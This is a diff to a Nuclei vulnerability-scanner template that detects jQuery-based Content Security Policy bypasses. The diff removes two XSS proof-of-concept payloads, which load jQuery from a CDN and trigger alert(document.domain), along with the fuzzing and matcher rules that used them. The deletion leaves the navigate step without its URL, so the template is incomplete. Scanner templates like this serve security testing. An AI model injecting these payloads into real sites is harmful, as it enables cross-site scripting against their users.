@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: jquery-cdn-csp-bypass
 
 info:
@@ -37,27 +38,5 @@ headless:
   - steps:
       - action: navigate
         args:
-          url: "{{BaseURL}}"
 
-      - action: waitdialog
-        name: jquery_csp_xss
-        args:
-          max-duration: 5s
-
-    payloads:
-      injection:
-        - '<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script><script>$.get("data:text/javascript,alert(document.domain)")</script>'
-        - '<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script><div id="x"></div><script>$("#x").html("<img src=x onerror=alert(document.domain)>")</script>'
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{url_encode(injection)}}"
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "jquery_csp_xss == true"
 # digest: 490a0046304402204dfeb2253ed0a5f3116c1a890920e318b7cca28ac18dd4f56d191f812f2c8f4d022060844041558f1c64441b60814f110186e2c16d65f9778c121aaed40e886e5eda:922c64590222798bb761d5b6d8e72950
